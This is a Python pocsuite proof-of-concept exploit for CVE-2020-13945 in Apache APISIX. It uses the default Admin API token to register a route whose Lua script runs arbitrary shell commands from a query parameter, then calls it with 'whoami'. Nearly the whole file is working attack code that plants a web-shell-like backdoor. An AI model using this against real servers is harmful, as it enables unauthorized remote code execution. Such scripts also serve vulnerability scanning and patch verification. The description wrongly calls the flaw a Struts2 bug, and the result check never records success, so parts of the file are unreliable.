#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import register,Output, POCBase
from pocsuite.thirdparty.guanxing import  parse_ip_port, http_packet, make_verify_url
import random
import string
import requests

class TestPOC(POCBase):
	vulID = '''CVE-2020-13945'''
	cveID = '''CVE-2020-13945'''
	cnvdID = ''''''
	cnnvdID = ''''''
	version = '''1.0'''
	author = '''侯博文'''
	vulDate = '''2020-12-8'''
	createDate = '''2020-12-8'''
	updateDate = '''2020-12-8'''
	name = '''Apache APISIX Admin API 默认Token漏洞'''
	desc = '''2020年08月13日，Apache官方发布了Struts2远程代码执行漏洞的风险通告，该漏洞编号为CVE-2020-13945，漏洞等级：高危，漏洞评分：8.5
	'''
	solution = '''1. 修改Apache APISIX配置文件中 conf/config.yaml 的admin_key，禁止使用默认Token
2. 若非必要，关闭Apache APISIX Admin API功能，或者增加IP访问限制。
3. 升级Apache APISIX 至最新版本。'''
	severity = '''高危''' 
	vulType = '''RCE'''
	taskType = ''''''
	references = ['''https://mp.weixin.qq.com/s/QnAyz8t1LGBsgTpexUNlwA''']
	appName = '''Apache APISIX'''
	appVersion = '''Apache APISIX 1.2-1.5'''
	appPowerLink = ''''''
	samples = ['']
	install_requires = ['''''']
	

	def _verify(self):
		self.url,ip,port = parse_ip_port(self.target, 80)
		result = {}
		randstr = ''.join(random.choice(string.ascii_letters) for _ in range(10))

		path = """/apisix/admin/routes"""
		method = "POST"
		data = {
			"uri":"/{randstr}".format(randstr=randstr),
			"script":"local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
			"upstream":{
				"type":"roundrobin",
				"nodes":{
				"example.com:80":1
				}
			}
		}
		headers = {'X-API-KEY': 'edd1c9f034335f136f87ad84b625c8f1', 'Content-Type': 'application/json'}
		resp0 = requests.request(method=method,url=self.url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

		path = """/{randstr}?cmd=whoami""".format(randstr=randstr)
		method = "GET"
		headers = {}
		resp1 = requests.request(method=method,url=self.url+path,headers=headers,timeout=10,verify=False,allow_redirects=False)
		print(resp1.text)
		return self.parse_output(result)

	def _attack(self):
		return self._verify()

	def parse_output(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('Failed')
		return output

register(TestPOC)